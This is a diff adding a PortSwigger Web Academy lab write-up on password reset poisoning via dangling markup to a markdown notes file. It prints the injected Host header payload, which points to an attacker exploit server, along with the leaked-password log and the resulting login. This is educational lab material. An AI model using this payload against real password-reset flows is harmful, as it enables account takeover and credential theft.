@@ -6,6 +6,48 @@ ignore_macros: true
 
 # PortSwigger Web Academy
 
+## HTTP Host Header attacks
+
+### Password leak via dangling markup
+
+> Lab: [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)
+
+A normal password reset will send the following email to the user :
+
+```
+Hello!
+
+Please click here (https://xxx.web-security-academy.net/login) to login with your new password: D7c0EJwAWM
+
+Thanks,
+Support team
+This email has been scanned by the MacCarthy Email Security service
+```
+
+We can inject the host header in the password reset request to modify the link inside the email :
+
+```
+POST /forgot-password HTTP/1.1
+Host: xxx.web-security-academy.net:CANARY1337 // <- here
+```
+
+We now have the following link : `https://xxx.web-security-academy.net:CANARY1337/login`
+
+Let's try to leak the password using dangling markup :
+
+```
+POST /forgot-password HTTP/1.1
+Host: xxx.web-security-academy.net:"></a><a href="https://exploit-xxx.exploit-server.net/#
+```
+
+Then, we receive the password on our exploit server because the antivirus or the victim clicked on the malicious link :
+
+```
+10.0.3.209      2022-12-09 17:29:37 +0000 "GET /#/login'>click+here</a>+to+login+with+your+new+password:+ld92i9hv1e</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 404 
+```
+
+You can now login into the carlos account with `carlos:ld92i9hv1e`.
+
 ## DOM Clobbering
 
 ### DOM clobbering to bypass DOMPurify
